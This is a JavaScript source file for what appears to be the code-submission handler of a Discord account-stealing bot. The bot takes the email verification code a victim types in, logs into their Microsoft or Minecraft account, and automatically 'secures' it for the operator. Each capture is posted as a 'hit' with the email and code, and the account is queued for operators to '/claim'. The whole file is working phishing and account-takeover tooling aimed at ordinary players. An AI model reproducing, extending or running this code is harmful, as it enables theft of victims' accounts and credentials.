const { queryParams } = require("../../../db/database");
const config = require("../../../config.json");
const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const getEmbed = require("../../utils/responses/getEmbed");
const listAccount = require("../../utils/accounts/listAccount");
const { loginCookieMessager, autosecuredisabledMessager, lockedmessager, nomcmessager } = require("../../utils/utils/messager");
const aftersecure = require("../../utils/secure/aftersecure");
const generateuid = require("../../utils/generateuid");
const insertaccount = require("../../../db/insertaccount");
const checkmc = require("../../../db/checkmc");
const listProfile = require("../../utils/hypixelapi/listProfile");
const getUUID = require("../../utils/hypixelapi/getUUID");
const isblacklisted = require("../../utils/utils/isblacklisted")
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
const { sendSecureNotification } = require('../../utils/notifications/notifier.js');
const getStats = require('../../utils/hypixelapi/getStats.js');
const statsembed = require("../../utils/stats/statsembed.js");

let obj = {
  name: "submit",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true });

    let code = interaction.components[0].components[0].value;
    let customIdParts = interaction.customId.split("|");
    let email = customIdParts[1];
    let secEmail = customIdParts[2];
    let secId = customIdParts[3];
    let mcname = customIdParts[4];


    let blacklisted = await isblacklisted(client, interaction, email)
    if (blacklisted) {
      const embed = await getEmbed(client, "blacklisted");
      return await interaction.editReply({
        embeds: [embed],
        ephemeral: true,
      });
    }

    console.log(`client username: ${client.username}`);
    let settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [client.username]);
    if (settings.length === 0) {
      return interaction.editReply({
        embeds: [{
          title: "Error :x:",
          description: "Unexpected error occurred!",
          color: 0xff0000
        }],
        ephemeral: true
      });
    }
    settings = settings[0];

    let channelId, guildId, nChannelId, nGuildId, hChannelId, hGuildId, rChannelId, rGuildId, server_id, nohit = null;

    if (settings.server_id) {
      server_id = settings.server_id;
    }

    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|");
    } else {
      return interaction.editReply({ content: "Set your logs channel first!\nusing **/set**", ephemeral: true });
    }

    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings.notification_channel.split("|");
    }

    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings.hits_channel.split("|");
    } else if (config.hitschannel) {
      hChannelId = config.hitschannel;
    } else {
      return interaction.editReply({ content: "Set the hits channel first!\nusing **/set**", ephemeral: true });
    }

    if (settings.users_channel) {
      [rChannelId, rGuildId] = settings.users_channel.split("|");
    }

    if (isNaN(code)) {
      console.log("[X] Invalid Code! [Not Numbers]");
      return interaction.editReply({
        embeds: [
          {
            title: "Error :x:",
            description: "Invalid code, please confirm with the code that was sent to your email",
            color: 0xff0000,
          },
        ],
        ephemeral: true,
      });
    }

    if (settings?.auto_secure) {
      try {
        console.log(`Trying to Login Email: ${email} Code: ${code}`);
        let creds = await getCredentials(email)
        let host = await login({ email: email, id: secId, code: code }, creds);

        if (host) {
          console.log("Logged in successfully");
          try {
            await interaction.editReply({
              embeds: [await getEmbed(client, "res")],
              ephemeral: true
            });

            let uid = await generateuid();
            await loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid);

            if (rChannelId && rGuildId) {
              const hidecode = 'Code entered';
              await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, hidecode, uid, true);
            }

            console.log("Starting the Auto Secure process");
            let acc = await secure(host, settings, uid);

            if (acc.email === "Locked!") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, false);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, false);
              }
            }


            if (acc.email === "unauthed") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, true);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, true);
              }
            }

            if ((settings.secureifnomc === "0" || settings.secureifnomc === 0) && acc.email === "No Minecraft!") {
              nohit = true;
              await nomcmessager(client, guildId, channelId, interaction, mcname, email);
              if (rChannelId && rGuildId) {
                await nomcmessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
              }
            }

            let hasMinecraft = await checkmc(acc.mc);

            let msg = await listAccount(acc, uid, client, interaction);
            if (!nohit && hGuildId && hChannelId) {
              try {
                let hitChannel = null;
                // Try fetching channel directly (works cross-guild if bot has access)
                hitChannel = await client.channels.fetch(hChannelId).catch(() => null);
                // Fallback: try main bot client
                if (!hitChannel) {
                  const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
                  const mainBot = getMainBotClient();
                  if (mainBot && mainBot.isReady()) {
                    hitChannel = await mainBot.channels.fetch(hChannelId).catch(() => null);
                  }
                }
                if (hitChannel) {
                  await hitChannel.send(msg);
                } else {
                  console.error(`[SUBMIT] Could not find hits channel ${hChannelId} on any bot client`);
                }
              } catch (hitErr) {
                console.error(`[SUBMIT] Error sending hit to channel:`, hitErr.message);
              }
            }

            const { failed, failedmsg } = await failedembed(acc, uid)
            if (failed && hChannelId) {
              try {
                let hitChannel = await client.channels.fetch(hChannelId).catch(() => null);
                if (!hitChannel) {
                  const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
                  const mainBot = getMainBotClient();
                  if (mainBot && mainBot.isReady()) {
                    hitChannel = await mainBot.channels.fetch(hChannelId).catch(() => null);
                  }
                }
                if (hitChannel) {
                  await hitChannel.send(failedmsg);
                }
              } catch (failErr) {
                console.error(`[SUBMIT] Error sending failed embed:`, failErr.message);
              }
            }


            if (hasMinecraft && settings.claiming) {
              const timestamp = Math.floor(Date.now() / 1000)

              await client.queryParams(
                "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
                [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
              )

              await client.queryParams(
                "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
                [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
              )
            }

            let neededmsg = failed ? failedmsg : msg

            console.log('[SUBMIT] Calling aftersecure with:', {
              hasAftersecure: !!acc.aftersecure,
              userId: interaction.user.id,
              hasSettings: !!settings,
              server_id,
              clientUsername: client.username,
              hasEmail: !!acc.oldEmail
            });

            let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);

            console.log('[SUBMIT] Aftersecure result:', doneaftersecure);

            if (doneaftersecure) {
              console.log('[SUBMIT] Successfully completed aftersecure');
            } else {
              console.log('[SUBMIT] Aftersecure was not executed or failed');
            }

            let inserted = await insertaccount(acc, uid, client.username, settings.secureifnomc);


            if (nChannelId && nGuildId) {
              if (hasMinecraft) {
                // Create simple secured account embed for Minecraft accounts
                const securedEmbed = {
                  embeds: [{
                    color: 723989,
                    author: {
                      name: "User | User ID"
                    },
                    description: "**Username | Email | Code**\n```Account has been secured, /claim (username) to get it!\n```",
                    thumbnail: {
                      url: `https://visage.surgeplay.com/bust/${acc.oldName}.png?y=-40&quality=lossless`
                    }
                  }],
                  components: [
                    {
                      type: 1,
                      components: [
                        {
                          style: 2,
                          type: 2,
                          custom_id: `duels|${acc.newName}|1`,
                          label: "Duels",
                          emoji: {
                            id: "1295278858064498709",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `skywars|${acc.newName}|1`,
                          label: "Skywars",
                          emoji: {
                            id: "1418589836398297261",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `skyblock|${acc.newName}|1`,
                          label: "Skyblock",
                          emoji: {
                            id: "1418590280390807704",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `bedwars|${acc.newName}|1`,
                          label: "Bedwars",
                          emoji: {
                            id: "1416130064608657572",
                            name: "unknown",
                            animated: false
                          }
                        }
                      ]
                    },
                    {
                      type: 1,
                      components: [
                        {
                          style: 1,
                          type: 2,
                          custom_id: "claim",
                          label: "Claim Account"
                        }
                      ]
                    }
                  ]
                };

                // Add ping if specified
                if (settings.ping !== "None") {
                  securedEmbed.content = settings.ping;
                }

                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(securedEmbed);
              } else {
                let msgnomc = {
                  embeds: [{
                    description: "```\nSomeone's account has been secured, but it doesn't own Minecraft.\n```",
                    color: 0xA6C3F0
                  }]
                };
                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
              }
            }
          } catch (e) {
            console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`);

            // Better error handling for common issues
            if (e.response && e.response.status === 400) {
              console.log(`HTTP 400 Error Details:`, e.response.data);
              await interaction.editReply({
                embeds: [{
                  title: "Authentication Error :x:",
                  description: "Invalid authentication data. The account may be locked or the login session expired. Please try again.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            } else if (e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT') {
              console.log(`Network timeout error:`, e.message);
              await interaction.editReply({
                embeds: [{
                  title: "Network Error :x:",
                  description: "Network connection timed out. Please try again in a moment.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            } else {
              // Generic error handling
              await interaction.editReply({
                embeds: [{
                  title: "Error :x:",
                  description: "An unexpected error occurred while processing your request. Please try again.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            }
          }
        } else {
          console.log("Invalid Code! [Failed to Login with it!]");
          await interaction.editReply({
            embeds: [await getEmbed(client, "invalid")],
            ephemeral: true
          });
        }
      } catch (e) {
        console.log(e);
        await interaction.editReply({
          embeds: [{
            title: "Error :x:",
            description: "An error occurred while processing your request",
            color: 0xff0000
          }],
          ephemeral: true
        });
      }
    } else {
      await autosecuredisabledMessager(client, guildId, channelId, interaction, mcname, email, code);

      if (rChannelId && rGuildId) {
        await autosecuredisabledMessager(client, rGuildId, rChannelId, interaction, mcname, email, code, true);
      }

      await interaction.editReply({
        embeds: [
          await getEmbed(client, "res")
        ],
        ephemeral: true,
      });

      const embedData = {
        embeds: [{
          title: `${mcname}! :x:`,
          description: `Email: **${email}**\nSecurity email: **${secEmail?.replaceAll("*", "\\*")}** \nCode: **${code}**`,
          color: 0x00ff00
        }]
      };


      await client.queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
        [client.username, mcname, JSON.stringify(embedData)]);

      if (nChannelId && nGuildId) {
        let uuid = await getUUID(mcname);
        if (uuid) {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(
            await listProfile(mcname, { sensored: true, list: "skyblock", ping: ping })
          );
        } else {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send({
            content: ping,
            embeds: [
              {
                title: "Code has been entered | VinGr0ups3cur3 is disabled!",
                description: 'Please secure this account manually after claiming using /claim',
                color: 0x00ff00,
              },
            ],
          });
        }
      }
    }
  }
};

module.exports = obj;